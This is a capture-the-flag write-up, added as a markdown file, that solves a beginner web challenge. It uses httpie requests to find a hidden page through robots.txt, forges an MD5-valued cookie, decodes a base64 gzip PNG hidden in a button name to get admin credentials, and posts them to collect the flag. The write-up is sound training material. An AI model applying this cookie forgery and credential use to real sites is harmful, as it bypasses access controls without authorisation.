@@ -1,0 +1,266 @@
+## Solution
+
+For this challenge, we have a url that need to reach until we get a flag:
+
+	http http://85.159.210.133/7a515eb5/
+	
+So after made our first request, we notice nothing awesome that give us the next step.
+
+So we try to look for more info:
+
+```
+$ http http://85.159.210.133/7a515eb5/robots.txt
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-Length: 53
+Content-Security-Policy: object-src 'self';
+Content-Type: text/plain
+Date: Thu, 11 Jan 2018 18:05:39 GMT
+Keep-Alive: timeout=5, max=60
+Last-Modified: Tue, 26 Sep 2017 08:04:30 GMT
+Referrer-Policy: no-referrer
+Server: Microsoft-IIS/5.0
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1;mode=block
+
+User-Agent: *
+Disallow: /
+Disallow: /start_level.php
+
+```	
+
+Great, now we know that a file start_level.php exist, lets make a GET:
+
+```
+http http://85.159.210.133/7a515eb5/start_level.php
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 955
+Content-Security-Policy: object-src 'self';
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 11 Jan 2018 18:07:01 GMT
+Keep-Alive: timeout=5, max=60
+Referrer-Policy: no-referrer
+Server: Microsoft-IIS/5.0
+Set-Cookie: continue=cfcd208495d565ef66e7dff9f98764da;HttpOnly;Secure
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1;mode=block
+
+```
+
+Interesting, that COOKIE, after finding the right value via md5cracker we see that that was only a zero, so lets make a one.
+
+	$ printf "0" | md5sum 
+	cfcd208495d565ef66e7dff9f98764da
+
+	$ printf "1" | md5sum
+	c4ca4238a0b923820dcc509a6f75849b
+
+Then using this value for the final cookie, lets try again:
+
+```
+$ http http://85.159.210.133/7a515eb5/start_level.php 'Cookie:continue=c4ca4238a0b923820dcc509a6f75849b;HttpOnly;Secure' Host:85.159.210.133 'Accept:*/*'
+HTTP/1.1 302 Found
+Connection: Keep-Alive
+Content-Length: 2445
+Content-Security-Policy: object-src 'self';
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 11 Jan 2018 18:15:08 GMT
+Keep-Alive: timeout=5, max=60
+Location: log_in.php
+Referrer-Policy: no-referrer
+Server: Microsoft-IIS/5.0
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1;mode=block
+```
+
+We get a now a 300 code and a location header, let follow that:
+
+```
+http http://85.159.210.133/7a515eb5/log_in.php 'Cookie:continue=c4ca4238a0b923820dcc509a6f75849b;HttpOnly;Secure' Host:85.159.210.133 'Accept:*/*'
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 1935
+Content-Security-Policy: object-src 'self';
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 11 Jan 2018 18:16:30 GMT
+Keep-Alive: timeout=5, max=60
+Referrer-Policy: no-referrer
+Server: Microsoft-IIS/5.0
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1;mode=block
+
+<html>
+<head>
+<title>Last step to finish!</title>:$
+<style>
+body {
+    background: url('http://i.imgur.com/Eor57Ae.jpg') no-repeat fixed center center;
+    background-size: cover;
+    font-family: Montserrat;
+}
+
+.logo {
+    width: 213px;
+    height: 36px;
+    background: url('http://i.imgur.com/fd8Lcso.png') no-repeat;
+    margin: 30px auto;
+}
+
+.login-block {
+    width: 320px;
+    padding: 20px;
+    background: #fff;
+    border-radius: 5px;
+    border-top: 5px solid #ff656c;
+    margin: 0 auto;
+}
+
+.login-block h1 {
+    text-align: center;
+    color: #000;
+    font-size: 18px;
+    text-transform: uppercase;
+    margin-top: 0;
+    margin-bottom: 20px;
+}
+
+.login-block input {
+    width: 100%;
+    height: 42px;
+    box-sizing: border-box;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    margin-bottom: 20px;
+    font-size: 14px;
+    font-family: Montserrat;
+    padding: 0 20px 0 50px;
+    outline: none;
+}
+
+.login-block input#username {
+    background: #fff url('http://i.imgur.com/u0XmBmv.png') 20px top no-repeat;
+    background-size: 16px 80px;
+}
+
+.login-block input#username:focus {
+    background: #fff url('http://i.imgur.com/u0XmBmv.png') 20px bottom no-repeat;
+    background-size: 16px 80px;
+}
+
+.login-block input#password {
+    background: #fff url('http://i.imgur.com/Qf83FTt.png') 20px top no-repeat;
+    background-size: 16px 80px;
+}
+
+.login-block input#password:focus {
+    background: #fff url('http://i.imgur.com/Qf83FTt.png') 20px bottom no-repeat;
+    background-size: 16px 80px;
+}
+
+.login-block input:active, .login-block input:focus {
+    border: 1px solid #ff656c;
+}
+
+.login-block button {
+    width: 100%;
+    height: 40px;
+    background: #ff656c;
+    box-sizing: border-box;
+    border-radius: 5px;
+    border: 1px solid #e15960;
+    color: #fff;
+    font-weight: bold;
+    text-transform: uppercase;
+    font-size: 14px;
+    font-family: Montserrat;
+    outline: none;
+    cursor: pointer;
+}
+
+.login-block button:hover {
+    background:
+}
+</style>
+</head>
+<body>
+<br /><br /><br /><br /><link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+<div class="login-block">
+    <h1>Login</h1>
+<form action="flag.php" method="post">
+  <div class="form-group">
+    <label for="email">User:</label>
+    <input type="text" name="user" class="form-control" id="email">
+  </div>
+  <div class="form-group">
+    <label for="pwd">Password:</label>
+    <input type="password" name="password" class="form-control" id="pwd">
+  </div>
+  <button type="submit" disabled='' name="H4sICIAAylkAA2MucC5uLmcA6wzwc+flkuJiYGDg9fRwCWJgYNQBYRZmoEh38GQ3ICUd4BPiCqT///9vb28/f/78+/fv19fXy8vL79+/Pz4+/uYZGyWgNGeBR2QxAwPfERBmnKrNJ83AwOzv6eIYUjHn7fXz+Y/SBI593Mh8zL1thrz7C69qvtBV3zomh+1tMvOqLuG7/UZwfdELwfgX++9W3r/e7ewSkrk3Mubl78AvpwoZ7Bs/fujjYMADFkgvSixe87z746X/CmHtJTrXdttEd9+JjdJ5+3/XvoL9K10mv84pPxYivqpKk/nqpSTd0rBXN46fCklP7xHt7e6fGWK+MmrN7H1/UxSvvTO0TtZxX3rHM3Xjs87fHzemTZrztc7Hzmblk1abiDVONWrx0el5wt7aetMPTN1jsrHteW/pxL9b7PdE3+1MnR9Ws2LtuyOvzk7y6s4Sez636+r2S5d2fl2bujzpZOy3yo1rd9e0JzE6bMjji7urcv/l/Wupn1++2/12cfXhZw+2Zkcdvr52yqrL78VeF8x98TWiuzDQN2mv/9YXQWvORl0qvG/25eqv3OTY3e93b9mSFLhWP4X94odzZ80SP3Be+rRtQpHeyRIDocobckkvXctUheJf52+zS51/+JLfDVmduw3FIq8vgZSujHRce6cvYNO8tzMXhwpnZ0599n1jeNDNXZ+9d0fUrerc/L1wn/UvgdxtM681+0949a/wzXfeV3ISvLMjtslu/v7L7mbEm71r6zLFT7+3YZ+82P/oUaszZvFmBszWk+f2bZ2WFW3vf/2hS3Td/HvFu/deDVxjcPvHQfWC+XPm9KXqbxT6+aP43aqH0ysjbn0M9n2SxBt/rzOK36598sP9HjW5tjardf+7h7c7Z2+ZdfbvJaNp9dvVzrbOP87V7F97yf7YuyM37nd2v+0uz678vbzXXeh/4ttr+mtbbknN7xNlm69wZdrXtfveR89eln8zNn1r6kOxfz3c4tPEVknPzgra3Tst/OIL7zWBsto8dg9TZp196xdz5t8qt43v7F/u6Uw1/+z36a763Bv1M3O2AX2W/cD7UJaGdtW16XviNOrXss//NXFf/txfflcumW7v/Zuqwv295ejm9Nq1rzOf7qop0y+MO76pedeTww+Ev3y+7fRk/p2qyl9TbG+nvFj8W+vF8/3/DUp5/x3fsOXbhqzvf7ZLnC2ZPyVcN/7RbRXLR6tX7Wz6/mnTcj+rfXdfftBNipx55797U/ERJjyJfN+5/ROW1u0xs1Z5BeJ6uvq5rHNKaAIAuVOUPsQDAAA=" class="btn btn-default">Submit</button>
+</form>
+
+</div>
+</body>
+</html>
+```
+
+Now we have a nice login page, with a rarely name for a button. First decode the base64, then was a gzip, and finally a PNG image.
+
+	printf "H4sICIAAylkAA2MucC5uLmcA6wzwc+flkuJiYGDg9fRwCWJgYNQBYRZmoEh38GQ3ICUd4BPiCqT///9vb28/f/78+/fv19fXy8vL79+/Pz4+/uYZGyWgNGeBR2QxAwPfERBmnKrNJ83AwOzv6eIYUjHn7fXz+Y/SBI593Mh8zL1thrz7C69qvtBV3zomh+1tMvOqLuG7/UZwfdELwfgX++9W3r/e7ewSkrk3Mubl78AvpwoZ7Bs/fujjYMADFkgvSixe87z746X/CmHtJTrXdttEd9+JjdJ5+3/XvoL9K10mv84pPxYivqpKk/nqpSTd0rBXN46fCklP7xHt7e6fGWK+MmrN7H1/UxSvvTO0TtZxX3rHM3Xjs87fHzemTZrztc7Hzmblk1abiDVONWrx0el5wt7aetMPTN1jsrHteW/pxL9b7PdE3+1MnR9Ws2LtuyOvzk7y6s4Sez636+r2S5d2fl2bujzpZOy3yo1rd9e0JzE6bMjji7urcv/l/Wupn1++2/12cfXhZw+2Zkcdvr52yqrL78VeF8x98TWiuzDQN2mv/9YXQWvORl0qvG/25eqv3OTY3e93b9mSFLhWP4X94odzZ80SP3Be+rRtQpHeyRIDocobckkvXctUheJf52+zS51/+JLfDVmduw3FIq8vgZSujHRce6cvYNO8tzMXhwpnZ0599n1jeNDNXZ+9d0fUrerc/L1wn/UvgdxtM681+0949a/wzXfeV3ISvLMjtslu/v7L7mbEm71r6zLFT7+3YZ+82P/oUaszZvFmBszWk+f2bZ2WFW3vf/2hS3Td/HvFu/deDVxjcPvHQfWC+XPm9KXqbxT6+aP43aqH0ysjbn0M9n2SxBt/rzOK36598sP9HjW5tjardf+7h7c7Z2+ZdfbvJaNp9dvVzrbOP87V7F97yf7YuyM37nd2v+0uz678vbzXXeh/4ttr+mtbbknN7xNlm69wZdrXtfveR89eln8zNn1r6kOxfz3c4tPEVknPzgra3Tst/OIL7zWBsto8dg9TZp196xdz5t8qt43v7F/u6Uw1/+z36a763Bv1M3O2AX2W/cD7UJaGdtW16XviNOrXss//NXFf/txfflcumW7v/Zuqwv295ejm9Nq1rzOf7qop0y+MO76pedeTww+Ev3y+7fRk/p2qyl9TbG+nvFj8W+vF8/3/DUp5/x3fsOXbhqzvf7ZLnC2ZPyVcN/7RbRXLR6tX7Wz6/mnTcj+rfXdfftBNipx55797U/ERJjyJfN+5/ROW1u0xs1Z5BeJ6uvq5rHNKaAIAuVOUPsQDAAA=" | base64 -d | zcat > /tmp/image1.png
+
+After open the image, we see a text on center as following:
+
+	admin
+	get_tha_c00l_pass
+
+Now we need to give this credentials via POST to flag.php
+
+```
+$ http -f POST http://85.159.210.133/7a515eb5/flag.php 'Cookie:continue=c4ca4238a0b923820dcc509a6f75849b;HttpOnly;Secure' Host:85.159.210.133 'Accept:*/*' user=admin password=get_tha_c00l_pass 
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 194
+Content-Security-Policy: object-src 'self';
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 11 Jan 2018 18:29:02 GMT
+Keep-Alive: timeout=5, max=60
+Referrer-Policy: no-referrer
+Server: Microsoft-IIS/5.0
+Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1;mode=block
+
+<html>
+<head>
+<title>Wow! Well done!</title>
+</head>
+<body bgcolor='#000000'><br /><br /><center><font color='white'>Welcome admin<br /><br />Congratulations, you are into the system.<br /><br /></font><font color='black'>The flag is: randomflagforbabyweblevel1</font></center>
+```
+
+Boom, now we get the flag. Lets make it valid for atenea:
+
+	$ printf "randomflagforbabyweblevel1" | md5sum
+	9042f674880629915f76cfd06137cfc4
+
+**flag{9042f674880629915f76cfd06137cfc4}**
